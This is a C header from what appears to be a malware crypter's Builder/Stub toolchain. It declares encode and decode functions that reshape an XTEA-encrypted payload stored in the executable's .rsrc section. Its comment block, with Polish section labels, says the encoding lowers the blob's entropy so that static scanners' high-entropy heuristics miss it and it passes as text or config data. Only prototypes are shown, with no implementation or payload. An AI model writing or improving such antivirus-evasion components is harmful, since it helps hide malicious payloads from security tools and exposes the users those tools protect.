#ifndef ENTROPY_CODEC_H
#define ENTROPY_CODEC_H

#include <Windows.h>

/*
 * ==========================================================================
 *  ENTROPY CODEC — nibble-to-text entropy shaping for the .rsrc payload blob
 *
 *  CZYM:  Each byte is split into two nibbles; every nibble (0..15) is
 *         mapped to one of 16 high-frequency lowercase ASCII letters.
 *         Encoded size = 2x decoded size.
 *
 *  DLACZEGO: A raw XTEA blob sits at ~7.99 bits/byte — the classic
 *         "high-entropy resource" heuristic every static scanner flags.
 *         After shaping, the resource measures ~4.0 bits/byte over a
 *         16-symbol alphabet, visually and statistically indistinguishable
 *         from text/config data at a glance.
 *
 *  JAK:    Builder runs EntropyEncode after XTEA (Phase 8.5); the metadata
 *         blobSize keeps the DECODED size, so Stub derives the encoded
 *         footprint as blobSize*2 and runs EntropyDecode in place of the
 *         old memcpy in GetPayloadFromResource.
 * ==========================================================================
 */

#ifdef __cplusplus
extern "C" {
#endif

/* in: decoded bytes, inLen bytes.  out: caller buffer of inLen*2 bytes. */
void EntropyEncode(const BYTE* in, DWORD inLen, BYTE* out);

/* in: encoded bytes (outLen*2).  out: caller buffer of outLen decoded bytes. */
void EntropyDecode(BYTE* out, const BYTE* in, DWORD outLen);

#ifdef __cplusplus
}
#endif

#endif /* ENTROPY_CODEC_H */
